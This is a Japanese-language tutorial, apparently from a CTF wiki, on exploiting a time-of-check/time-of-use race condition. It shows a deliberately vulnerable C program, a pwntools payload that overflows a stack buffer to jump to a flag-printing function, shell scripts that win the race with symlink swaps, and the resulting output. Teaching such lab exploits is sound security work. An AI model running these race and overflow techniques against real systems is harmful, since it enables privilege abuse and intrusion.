# 問題

## 例の作成

### ソースコード

ソースコードは次のとおりです。

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
void showflag() { system("cat flag"); }
void vuln(char *file, char *buf) {
  int number;
  int index = 0;
  int fd = open(file, O_RDONLY);
  if (fd == -1) {
    perror("open file failed!!");
    return;
  }
  while (1) {
    number = read(fd, buf + index, 128);
    if (number <= 0) {
      break;
    }
    index += number;
  }
  buf[index + 1] = '\x00';
}
void check(char *file) {
  struct stat tmp;
  if (strcmp(file, "flag") == 0) {
    puts("file can not be flag!!");
    exit(0);
  }
  stat(file, &tmp);
  if (tmp.st_size > 255) {
    puts("file size is too large!!");
    exit(0);
  }
}
int main(int argc, char *argv[argc]) {
  char buf[256];
  if (argc == 2) {
    check(argv[1]);
    vuln(argv[1], buf);
  } else {
    puts("Usage ./prog <filename>");
  }
  return 0;
}
```

### 分析

プログラムの基本的な流れは次のとおりです。

- 渡されたコマンドライン引数が “flag” かどうかを検査し、そうであれば終了する。
- 渡されたコマンドライン引数に対応するファイルのサイズが 255 より大きいかどうかを検査し、大きければそのまま終了する。
- コマンドライン引数に対応するファイルの内容を buf に読み込む。buf のサイズは 256 である。

ファイルサイズを検査しており、buf のサイズも想定される最大サイズに足りているように見えますが、ここには条件競争(race condition)の問題があります。

プログラムがファイルサイズを検査し終えた後に、そのファイルを削除してもっと大きな別のファイルへのシンボリックリンクに置き換えると、プログラムが読み込む内容が増え、スタックオーバーフローが発生します。

### 基本方針

基本方針は次のとおりです。目的は `flag` の内容を取得することです。そのためには、スタックオーバーフローで `main` 関数のリターンアドレスを書き換えればよく、逆アセンブルとデバッグで `showflag` のアドレスが分かるので、それを使って payload を作ります。

```python
➜  racetest cat payload.py 
from pwn import *
test = ELF('./test')
payload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])
open('big', 'w').write(payload)
```

条件競争を起こす2つのスクリプトは次のとおりです。

```sh
➜  racetest cat exp.sh    
#!/bin/sh
for i in `seq 500`
do
    cp small fake
    sleep 0.000008
    rm fake
    ln -s big fake
    rm fake
done
➜  racetest cat run.sh 
#!/bin/sh
for i in `seq 1000`
do
    ./test fake
done
```

exp は、対応する時間窓の中で fake ファイルを削除し、同時にシンボリックリンクを作ることで競争に参加します。run はプログラムを実行します。

### 実際の結果

```shell
➜  racetest (sh exp.sh &) && sh run.sh
[...]
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
open file failed!!: No such file or directory
file size is too large!!
open file failed!!: No such file or directory
open file failed!!: No such file or directory
flag{race_condition_succeed!}
[...]
```

成功の鍵は、`sleep` の時間をどう選ぶかにあります。

## 参考

- http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html
- http://www.cnblogs.com/huxiao-tee/p/4660352.html
- https://github.com/dirtycow/dirtycow.github.io